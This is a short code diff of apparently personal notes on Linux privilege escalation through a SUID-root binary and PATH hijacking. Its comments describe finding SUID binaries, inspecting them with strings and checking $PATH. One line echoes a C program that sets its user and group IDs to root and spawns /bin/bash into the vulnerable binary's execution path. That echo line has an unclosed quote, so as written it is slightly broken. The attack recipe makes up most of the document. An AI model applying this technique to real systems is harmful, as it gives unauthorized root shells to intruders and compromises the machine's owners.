@@ -1,9 +1,10 @@
-// this is contingent on a vulnerable binary in Linux with the Owner Permission SUID set to 'rws' 
-// this allows for execution of said vulnerable binary as root
-// create a simple C file for linux priv esc that will execute when $PATH of vulnerabl env variable is called
+// find all env variables on the Linux system and observe if there are vulnerable binaries with Owner Permission SUID set to 'rws' / -perm -04000
+// use Linux 'strings' function to see if the vulnerable binary starts any services when run
+// use 'print $PATH' to find execution path for service of this vulnerable binary
 
 
 
+// echo a simple C file for linux priv esc that will execute when $PATH of vulnerabl env variable is called
 echo 'int main () { setgid(0); setuid(0); system("/bin/bash"); return 0;} > /dir_where_$PATH_goes_to_execute_vulnerable_bin/name_of_file.c
 
 
